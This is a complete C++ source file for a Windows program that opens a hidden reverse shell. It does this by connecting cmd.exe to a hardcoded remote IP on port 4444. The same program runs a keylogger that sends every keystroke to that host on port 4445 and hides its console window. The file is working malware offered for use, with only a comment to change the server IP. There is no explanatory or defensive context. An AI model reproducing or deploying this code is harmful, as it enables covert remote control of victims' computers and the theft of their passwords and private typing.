#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <iostream>
#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <stdlib.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")

void sendToServer(SOCKET sock, const std::string& data);
std::string getKey(unsigned short c);

WSADATA wsaData;
SOCKET Winsock;
SOCKET KeylogSock;
struct sockaddr_in hax;
const char* ip_addr = "172.16.227.147"; // Change to your server IP
const char* port = "4444";
const char* keylog_port = "4445"; // Separate port for keylogs

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

int main()
{
    // Initialize Winsock
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }

    // Setup reverse shell connection
    memset(&hax, 0, sizeof(hax));
    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    inet_pton(AF_INET, ip_addr, &hax.sin_addr);

    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    if (WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        printf("Reverse shell connection failed\n");
        return 1;
    }

    // Setup keylog connection
    KeylogSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    hax.sin_port = htons(atoi(keylog_port));
    if (WSAConnect(KeylogSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        printf("Keylog connection failed\n");
        return 1;
    }

    // Start reverse shell
    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    ini_processo.wShowWindow = SW_HIDE;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &ini_processo, &processo_info);

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Keylogger loop
    unsigned char keyboardState[256] = { 0 };
    unsigned short buffer[2];
    HKL keyboardLayout = GetKeyboardLayout(0);

    while (true) {
        Sleep(10);

        for (unsigned short k = 0; k < 256; k++) {
            int keyState = GetAsyncKeyState(k);

            if (keyState == -32767 && k != 16 && k != 160 && k != 162 && k != 163 && k != 164 && k != 165) {
                std::string str = getKey(k);
                if (str.empty()) {
                    int ret = ToAsciiEx(k, MapVirtualKeyEx(k, 0, keyboardLayout), keyboardState, buffer, 0, keyboardLayout);
                    if (ret == 1) str = std::string("") + (char)buffer[0];
                    else if (ret == 2) str = "?";
                    else str = "[" + std::to_string((unsigned short)k) + "]";
                }
                sendToServer(KeylogSock, str);
            }
        }
    }
    return 0;
}

void sendToServer(SOCKET sock, const std::string& data) {
    send(sock, data.c_str(), data.length(), 0);
}

std::string getKey(unsigned short c) {
    switch (c) {
    case VK_SPACE: return " ";
    case VK_RETURN: return "\n";
    case VK_BACK: return "⌫";
    case VK_DELETE: return "⌦";
    case VK_LBUTTON: return "[LMB]";
    case VK_RBUTTON: return "[RMB]";
    case VK_MBUTTON: return "[MMB]";
    case 91: return "[WIN]";
    case VK_CONTROL: return "[CTRL]";
    case VK_MENU: return "[ALT]";
    case VK_ESCAPE: return "[ESC]";
    case VK_UP: return "↑";
    case VK_DOWN: return "↓";
    case VK_LEFT: return "←";
    case VK_RIGHT: return "→";
    case VK_TAB: return "[TAB]";
    case VK_CAPITAL: return "[CAPS]";
    }
    return "";
}
